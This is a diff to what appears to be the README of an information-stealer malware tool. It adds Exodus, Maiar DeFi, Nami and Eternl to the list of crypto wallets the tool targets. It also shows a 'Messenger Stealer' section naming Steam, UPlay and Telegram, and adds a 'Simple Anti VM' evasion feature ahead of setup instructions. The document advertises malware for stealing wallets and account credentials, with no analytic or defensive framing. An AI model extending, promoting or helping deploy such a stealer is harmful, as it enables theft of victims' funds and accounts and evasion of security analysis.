@@ -118,6 +118,10 @@
 	-Auro Wallet
 	-Saturn Wallet
 	-Ronin Wallet
+	-Exodus
+	-Maiar DeFi Wallet
+	-Nami
+	-Eternl
 
 ------------
 ### Messenger Stealer
@@ -131,6 +135,10 @@
 - Steam
 - UPlay
 - Telegram
+
+- Simple Anti VM
+
+
 
 
 ## How to setup?
